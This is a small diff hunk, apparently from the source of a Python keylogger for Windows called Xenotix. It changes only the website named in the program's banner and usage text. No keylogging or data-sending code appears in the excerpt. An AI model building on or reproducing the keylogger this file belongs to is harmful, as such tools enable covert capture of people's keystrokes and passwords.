@@ -57,7 +57,7 @@ def hide():
 def msg():
     print """Xenotix Python Keylogger for Windows
 Coder: Ajin Abraham <ajin25@gmail.com>
-www.keralacyberforce.in
+OPENSECURITY.IN
 
 usage:xenotix_python_logger.py mode
 mode:
